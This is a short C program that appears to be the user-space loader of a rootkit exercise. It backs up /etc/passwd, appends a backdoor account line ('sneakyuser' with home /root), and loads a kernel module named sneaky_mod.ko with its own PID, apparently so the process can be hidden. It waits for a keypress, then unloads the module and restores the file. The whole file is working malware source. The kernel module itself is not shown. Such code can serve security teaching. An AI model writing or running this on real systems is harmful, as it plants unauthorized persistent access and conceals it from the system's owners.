#define _GNU_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    pid_t pid = getpid();
    printf("sneaky_process pid = %d\n", pid);
    if (system("cp /etc/passwd /tmp/passwd") == -1) {
	fprintf(stderr, "Child process could not be created\n");
    }
    if (system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd") == -1) {
	fprintf(stderr, "Child process could not be created\n");
    }
    char* str;
    asprintf(&str, "%i", pid);
    char command[] = "insmod sneaky_mod.ko mypid=";
    char* result = malloc(strlen(command) + strlen(str) + 1);
    strcpy(result, command);
    strcat(result, str);

    if (system(result) == -1) {
        fprintf(stderr, "Child process could not be created\n");
    }

    int c;
    do {
        c = getchar();
    } while (c != 'q');

    if (system("rmmod sneaky_mod.ko") == -1) {
        fprintf(stderr, "Child process could not be created\n");
    }

    free(result);
    if (system("cp /tmp/passwd /etc/passwd") == -1) {
        fprintf(stderr, "Child process could not be created\n");
    }    

    return 0;
}
